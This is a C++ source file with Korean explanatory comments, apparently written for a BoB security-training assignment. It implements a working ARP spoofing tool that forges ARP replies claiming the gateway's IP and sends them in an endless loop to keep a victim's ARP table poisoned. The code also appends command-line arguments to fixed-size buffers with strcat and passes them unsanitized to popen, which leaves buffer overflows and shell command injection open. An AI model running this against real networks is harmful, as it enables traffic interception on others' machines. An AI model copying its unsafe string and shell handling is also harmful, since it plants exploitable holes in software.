// 과제를 하기 위해 우연히 필자의 깃허브로
// 흘러 들어온 BoB 멘티들을 위해 주석을 남깁니다.

/*
    과제 내용
    - 조건 : 대상의 ARP table을 변조하라.
    - 실행 : send-arp <interface> <sender ip> <target ip>
    ① Target에게 ARP infection packet을 보낸다.
    ② Sender에서 바라 보는 Target의 ARP table이 변조되는 것을 확인해 본다(arp -an).
    ③ Target은 물리적으로 다른 호스트로 테스트할 것(하나의 가상 환경에서 여러개 띄워 테스트하지 말 것).
    - 기한 : 2020.08.04 23:59
*/

// 입출력을 위한 라이브러리를 추가합니다.
#include <cstdio>
#include <stdio.h>
#include <iostream>
#include <stdexcept>
// 통신을 위한 라이브러리르 추가합니다.
#include <pcap.h>
#include <sys/ioctl.h>
#include <net/if.h> 
#include <unistd.h>
#include <netinet/in.h>
// 문자열 사용을 위한 라이브러리를 추가합니다.
#include <string.h>
#include <string>
// 파일 형식의 라이브러리를 가져옵니다.
#include "arphdr.h"
#include "ethhdr.h"

// 이더넷 패킷 관련 구조체를 생성합니다.
#pragma pack(push, 1)
struct EthArpPacket {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

// 사용법을 출력하는 함수를 생성합니다.
void usage() {
    printf("syntax : send-arp <interface> <sender ip> <target ip>\n");
    printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

// Linux 명령어를 실행시키고, 그 결과를 문자열로 가져오는 함수입니다.
// 인자로는 실행시킬 명령어가 들어갑니다.
char* exec(const char* cmd) {
    // 1024bytes 크기의 버퍼 배열을 준비합니다.
    char buffer[1024];
    // 결과를 담을 string 변수를 준비합니다.
    std::string result = "";
    // cmd 창을 열고 읽기 모드로 연결합니다.
    FILE* pipe = popen(cmd, "r");
    // 에러가 났을 경우
    if (!pipe) {
        // 에러를 뿜습니다.
        throw std::runtime_error("popen() failed!");
    }
    try {
        // 출력값이 NULL이 아닐 때 까지 명령어 출력문구를 가져옵니다.
        while (fgets(buffer, sizeof buffer, pipe) != NULL) {
            // result 변수 안에 버퍼에 담긴 내용을 담습니다.
            result += buffer;
        }
    } catch (...) {
        pclose(pipe);
        throw;
    }
    pclose(pipe);
    // 결과물을 담을 char 형식 변수를 result 문자열 크기 만큼 생성합니다.
    char *cstr = new char[result.length() + 1];
    // 결과물을 캐릭터형 변수에 담습니다.
    strcpy(cstr, result.c_str());
    // char 형태의 cmd 출력 결과를 반환합니다.
    return cstr;
}

// 커맨드를 실행 시킨 후, 출력 결과물을 띄어쓰기 단위로 잘라내어
// index 번 째 값을 반환시킵니다.
char* commandSplitter(const char* command, int index) {
    // 커맨드를 실행시키고, 그 결과를 담습니다.
    char *stra = exec(command);
    // 결과물을 자르기 위해 새 변수를 선언합니다.
    char *lineSplit;
	try{
        // 결과물로 부터 첫 번째 띄어쓰기 값을 가져옵니다.
        lineSplit = strtok(stra, " ");
        // 그 결과 NULL이 아닐 경우,
        if(lineSplit != NULL) {
            //  index 번 째 까지 띄어쓰기를 잘라냅니다.
            int count = 0;
            for(count = 0; count < index && lineSplit != NULL; count++) {
                lineSplit = strtok(NULL, " ");
            }
        // 결과가 NULL일 경우, NULL을 반환합니다.
        } else {
            return NULL;
        }
	} catch(...) {
		return NULL;
	}
    // 잘라내어 진 결과물을 반환합니다.
    return lineSplit;
}

// 프로그램 실행 시 처음으로 호출 될 메인 함수입니다.
// argc는 입력한 인자의 개수를 나타내며
// argv에는 입력한 인자가 배열 형식으로 담겨있습니다.
int main(int argc, char* argv[]) {
    // 입력된 인자 수가 3개 (네트워크 인터페이스, SenderIP, TargetIP)가 아닐 경우
    if (argc != 4) {
        // 사용법을 출력하고 프로그램을 종료합니다.
        usage();
        return -1;
    }
    
    // 이경문 멘토님이 미리 작성 해 두신 소켓 연결 코드입니다.
    struct ifreq ifr;
    struct ifconf ifc;
    char buf[1024];
    int success = 0;

    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
    if (sock == -1) { /* handle error*/ };

    ifc.ifc_len = sizeof(buf);
    ifc.ifc_buf = buf;
    if (ioctl(sock, SIOCGIFCONF, &ifc) == -1) { /* handle error */ }

    struct ifreq* it = ifc.ifc_req;
    const struct ifreq* const end = it + (ifc.ifc_len / sizeof(struct ifreq));

    for (; it != end; ++it) {
        strcpy(ifr.ifr_name, it->ifr_name);
        if (ioctl(sock, SIOCGIFFLAGS, &ifr) == 0) {
            if (! (ifr.ifr_flags & IFF_LOOPBACK)) { // don't count loopback
                if (ioctl(sock, SIOCGIFHWADDR, &ifr) == 0) {
                    success = 1;
                    break;
                }
            }
        }
        else { /* handle error */ }
    }
    unsigned char mac_address[6];

    if (success) memcpy(mac_address, ifr.ifr_hwaddr.sa_data, 6);
    
    // ping argv[2] -c 2 명령어를 만듭니다.
    char pingSender[] = "ping ";
    strcat(pingSender, argv[2]);
    strcat(pingSender, " -c 2");
    printf("Finding Sender...\n");
    // 해당 명령어를 실행하여, 해당 ip를 가진 디바이스를 찾습니다.
    exec(pingSender);
	
    // ping argv[3] -c 2 명령어를 만듭니다.
    char pingTarget[] = "ping ";
    strcat(pingTarget, argv[3]);
    strcat(pingTarget, " -c 2");
    printf("Finding Target...\n");
    // 해당 명령어를 실행하여, 해당 ip를 가진 디바이스를 찾습니다.
    exec(pingTarget);
    
    // ping을 하는 이유:
    // ping에 성공하면 arp 테이블에 대상의 MAC이 저장되기 때문입니다.
    
    // Sender IP는 2번째 인자로 설정합니다.
    char *senderIp = argv[2];
    // 대상에 대한 arp 테이블을 확인하는 명령어를 만듭니다.
    // arp -a | grep argv[2]
    char senderArpCommand[] = "arp -a | grep ";
    strcat(senderArpCommand, argv[2]);
    // Sender의 MAC 주소를 위 명령어를 통해 가져옵니다.
    char *senderMAC = commandSplitter(senderArpCommand, 3);
    // 만일 대상을 찾지 못했다면
    if(senderMAC == NULL || strcmp(senderMAC, "<incomplete>") == 0) {
        // 대상을 찾지 못했다고 알리며, 프로그램을 종료합니다.
        printf("Target not found...\n");
        return -1;
    }
	
    // 본인 PC MAC을 가져옵니다.
    // 보통 /sys/class/net/ens33/address 경로에 저장됩니다.
    char macCommand[] = "cat /sys/class/net/";
    strcat(macCommand, argv[1]);
    strcat(macCommand, "/address");
    char *myMAC = exec(macCommand);
    // 가져올 때 끝에 개행문자가 붙으므로, 마지막 한 자를 제거합니다.
    myMAC[strlen(myMAC) - 1] = '\0';
		
    // 본인 PC의 IP를 가져옵니다.
    char myIpCommand[] = "ifconfig ";
    strcat(myIpCommand, argv[1]);
    strcat(myIpCommand, " | grep inet");
    char *myIp  = commandSplitter(myIpCommand, 1);

    // 대상 IP는 3번째 인자로 설정합니다.
    char *targetIp = argv[3];
    
    // 게이트웨이의 IP 값을 명령어를 통해 가져옵니다. 가져올 때, 괄호가 붙으므로 cut을 통해 떼어냅니다.
    // arp -a | grep _gateway | cut -f 2 -d '(' | cut -f 1 -d ')'
    char *gatewayIp = exec("arp -a | grep _gateway | cut -f 2 -d '(' | cut -f 1 -d ')'");
    // 가져올 때 끝에 개행문자가 붙으므로, 마지막 한 자를 제거합니다.
    gatewayIp[strlen(gatewayIp) - 1] = '\0';
    // 게이트웨이의 MAC 주소를 가져옵니다.
    char *gatewayMAC = commandSplitter("arp -a | grep _gateway", 3);
    
    // 가져온 정보를 화면에 알려줍니다.
    printf("Sender IP : %s (len : %d)\n", senderIp, strlen(senderIp));
    printf("Sender MAC : %s (len : %d)\n", senderMAC, strlen(senderMAC));
    printf("Target IP : %s (len : %d)\n", targetIp, strlen(targetIp));
    printf("My IP : %s (len : %d)\n", myIp, strlen(myIp));
    printf("My MAC : %s (len : %d)\n", myMAC, strlen(myMAC));

    // 디바이스로 1번째 인자에 들어있는 값을 설정하고,
    char* dev = argv[1];
    // 에러 메시지를 담을 변수를 준비합니다.
    char errbuf[PCAP_ERRBUF_SIZE];
    // 이후 연결을 시도합니다.
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    // 연결이 실패했을 경우
    if (handle == nullptr) {
        // 에러 메시지를 날리고 종료합니다.
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }
    
    // 공격용 패킷을 준비합니다.
    EthArpPacket packet;

    // 공격 대상과 내 PC의 네트워크 정보들을 구조체에 맞게 기입합니다.
    packet.eth_.dmac_ = Mac(senderMAC);
    packet.eth_.smac_ = Mac(myMAC);
    packet.arp_.smac_ = Mac(myMAC);
    packet.arp_.sip_ = htonl(Ip(gatewayIp));
    packet.arp_.tmac_ = Mac(senderMAC);
    packet.arp_.tip_ = htonl(Ip(senderIp));
    
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    
    printf("\n\n[Annoying %s...]\n", senderIp);
    // ARP 패킷을 지속적으로 보내어
    // 상대 ARP테이블이 새로고침 되더라도
    // 다시 오염되게 만듭니다.
    while(true) {
        // 패킷을 보내고 결과를 RES에 담습니다.
        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        // RES가 0이 아닐 경우
        if (res != 0) {
            // 에러 메시지를 출력합니다.
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
    }
    // 모든작업이 끝날 경우, 연결을 종료합니다.
    pcap_close(handle);
}
